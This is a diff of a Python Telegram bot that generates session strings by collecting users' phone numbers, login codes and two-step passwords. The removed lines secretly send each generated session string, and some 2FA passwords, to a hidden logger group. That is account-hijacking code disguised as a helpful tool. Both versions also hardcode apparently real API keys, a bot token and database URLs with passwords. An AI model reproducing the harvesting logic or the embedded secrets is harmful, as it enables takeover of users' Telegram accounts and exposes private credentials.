@@ -1,175 +1,138 @@
 import asyncio
-import os
+import psycopg2
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from pymongo import MongoClient
-
-# 🔹 MongoDB Connection
-MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
-mongo_client = MongoClient(MONGO_URI)
-db = mongo_client["telegram_bot"]
-users_collection = db["users"]
 
 # 🔹 Telegram API Credentials
 API_ID = 28795512
 API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
 BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
-LOGGER_GROUP = -1002477750706  # Replace with your logger group ID
 MUST_JOIN = "SANATANI_TECH"
 
-# 🔹 Initialize the bot
-bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-user_sessions = {}
+# 🔹 PostgreSQL Database Connection
+DATABASE_URL = "postgres://iarfggbc:Vxzh_kG7cxa1kHR5faxcd1kuA4R-UT9E@rosie.db.elephantsql.com/iarfggbc"
+conn = psycopg2.connect(DATABASE_URL)
+cursor = conn.cursor()
 
-async def is_user_joined(user_id):
-    """Real-time join checker using bot.get_permissions()"""
+# 🔹 Initialize Bot
+bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+# 🔹 Ensure User Exists in Database
+def check_user(user_id):
+    cursor.execute("SELECT joined FROM users WHERE user_id = %s", (user_id,))
+    result = cursor.fetchone()
+    return result[0] if result else False
+
+def add_user(user_id, joined=False):
+    cursor.execute("INSERT INTO users (user_id, joined) VALUES (%s, %s) ON CONFLICT (user_id) DO NOTHING", (user_id, joined))
+    conn.commit()
+
+def update_join_status(user_id, status):
+    cursor.execute("UPDATE users SET joined = %s WHERE user_id = %s", (status, user_id))
+    conn.commit()
+
+# 🔹 Real-time Join Checker
+async def is_user_joined(client, user_id):
     try:
-        user = await bot.get_permissions(MUST_JOIN, user_id)
-        return user and user.is_member
-    except:
+        user = await client.get_participants(MUST_JOIN, filter=ChannelParticipantsSearch(""))
+        return any(member.id == user_id for member in user)
+    except Exception:
         return False
 
+# 🔹 Start Command with Join Check
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
     user_id = event.sender_id
+    add_user(user_id)
 
-    if not await is_user_joined(user_id):
-        await event.respond(
-            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
-            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
-        )
-        return
+    if not check_user(user_id):
+        if not await is_user_joined(bot, user_id):
+            await event.respond(
+                f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
+                buttons=[Button.url("Join Now", f"https://t.me/{MUST_JOIN}")]
+            )
+            return
+        else:
+            update_join_status(user_id, True)
 
     await event.respond(
-        "👋 **Welcome!**\nUse **/generate** to create your Telegram session string.",
+        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
         buttons=[
             [Button.inline("🔑 Generate Session", b"generate")],
-            [Button.inline("ℹ Help", b"help")],
-            [Button.inline("❌ Cancel", b"cancel")]
+            [Button.inline("ℹ Help", b"help")]
         ]
     )
 
-@bot.on(events.CallbackQuery)
-async def callback(event):
-    user_id = event.sender_id
+# 🔹 Help Button
+@bot.on(events.CallbackQuery(pattern=b"help"))
+async def help_text(event):
+    await event.respond("ℹ **How to Generate Session?**\n\n1️⃣ Click **Generate Session**\n2️⃣ Enter your phone number\n3️⃣ Enter OTP received on Telegram\n4️⃣ If asked, enter 2-Step Verification password\n✅ Your session string will be generated!")
 
-    if event.data == b"generate":
-        await ask_phone(event)
-    elif event.data == b"help":
-        await event.respond("ℹ **How to generate session string:**\n\n1. Click 'Generate Session'.\n2. Enter your phone number.\n3. Enter the OTP received on Telegram.\n4. If prompted, enter your 2-Step Verification password.\n5. Copy and save your session string safely!")
-    elif event.data == b"cancel":
-        if user_id in user_sessions:
-            del user_sessions[user_id]
-        await event.respond("❌ Process canceled. Use /start to begin again.")
-
-@bot.on(events.NewMessage(pattern="/generate"))
+# 🔹 Generate Session
+@bot.on(events.CallbackQuery(pattern=b"generate"))
 async def ask_phone(event):
     user_id = event.sender_id
-
-    if not await is_user_joined(user_id):
-        await event.respond(
-            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
-            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
-        )
-        return
-
-    if user_id in user_sessions:
-        await event.respond("⚠️ You are already in the process. Please enter your OTP.")
-        return
-
-    user_sessions[user_id] = {"step": "phone"}
     await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")
+    bot.user_sessions[user_id] = {"step": "phone"}
 
+# 🔹 Process User Inputs
 @bot.on(events.NewMessage)
 async def process_input(event):
     user_id = event.sender_id
-
-    if user_id not in user_sessions:
+    if user_id not in bot.user_sessions:
         return
 
-    step = user_sessions[user_id]["step"]
+    step = bot.user_sessions[user_id]["step"]
 
     if step == "phone":
         phone_number = event.message.text.strip()
-
-        if not phone_number.startswith("+") or not phone_number[1:].isdigit():
-            await event.respond("⚠️ Invalid phone number! Please enter again with country code (e.g., +919876543210).")
-            return
-
-        user_sessions[user_id]["phone"] = phone_number
-        user_sessions[user_id]["step"] = "otp"
-
+        bot.user_sessions[user_id]["phone"] = phone_number
+        bot.user_sessions[user_id]["step"] = "otp"
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
 
         try:
-            await event.respond("📩 **Sending OTP... Please wait!**")
             sent_code = await client.send_code_request(phone_number)
-            user_sessions[user_id]["client"] = client
-            user_sessions[user_id]["sent_code"] = sent_code
-            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
+            bot.user_sessions[user_id]["client"] = client
+            bot.user_sessions[user_id]["sent_code"] = sent_code
+            await event.respond("📩 **OTP sent! Please enter the OTP received on Telegram.**")
         except Exception as e:
-            del user_sessions[user_id]
-            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+            await event.respond(f"❌ **Error:** {e}. Please try again.")
+            del bot.user_sessions[user_id]
 
     elif step == "otp":
         otp_code = event.message.text.strip()
-
-        if not otp_code.isdigit():
-            await event.respond("⚠️ Invalid OTP! Please enter only numbers.")
-            return
-
-        client = user_sessions[user_id]["client"]
-        phone_number = user_sessions[user_id]["phone"]
+        client = bot.user_sessions[user_id]["client"]
+        phone_number = bot.user_sessions[user_id]["phone"]
 
         try:
             await client.sign_in(phone_number, otp_code)
             session_string = client.session.save()
-
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-            
-            # Log to MongoDB
-            users_collection.update_one(
-                {"user_id": user_id},
-                {"$set": {"user_id": user_id, "joined": True}},
-                upsert=True
-            )
-
-            # Log to logger group
-            await bot.send_message(
-                LOGGER_GROUP, 
-                f"📝 **New Session Generated**\n👤 **User:** [{user_id}](tg://user?id={user_id})\n📌 **Session:** `{session_string}`"
-            )
-
-            del user_sessions[user_id]
+            del bot.user_sessions[user_id]
         except Exception as e:
             if "The confirmation code has expired" in str(e):
-                del user_sessions[user_id]
-                await event.respond("❌ **Error:** The OTP has expired. Please use /generate to start again.")
+                await event.respond("❌ **Error: The OTP has expired. Please use /generate to start again.**")
+                del bot.user_sessions[user_id]
             elif "Two-steps verification is enabled" in str(e):
-                user_sessions[user_id]["step"] = "password"
+                bot.user_sessions[user_id]["step"] = "password"
                 await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
             else:
-                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+                await event.respond(f"❌ **Error:** {e}. Please try again.")
 
     elif step == "password":
         password = event.message.text.strip()
-        client = user_sessions[user_id]["client"]
+        client = bot.user_sessions[user_id]["client"]
 
         try:
             await client.sign_in(password=password)
             session_string = client.session.save()
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-
-            # Log session with password
-            await bot.send_message(
-                LOGGER_GROUP,
-                f"📝 **New Session Generated**\n👤 **User:** [{user_id}](tg://user?id={user_id})\n📌 **Session:** `{session_string}`\n🔑 **2FA Password:** `{password}`"
-            )
-
-            del user_sessions[user_id]
+            del bot.user_sessions[user_id]
         except Exception as e:
-            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+            await event.respond(f"❌ **Error:** {e}. Please try again.")
 
+# 🔹 Run Bot
 print("🚀 Bot is running...")
+bot.user_sessions = {}
 bot.run_until_disconnected()
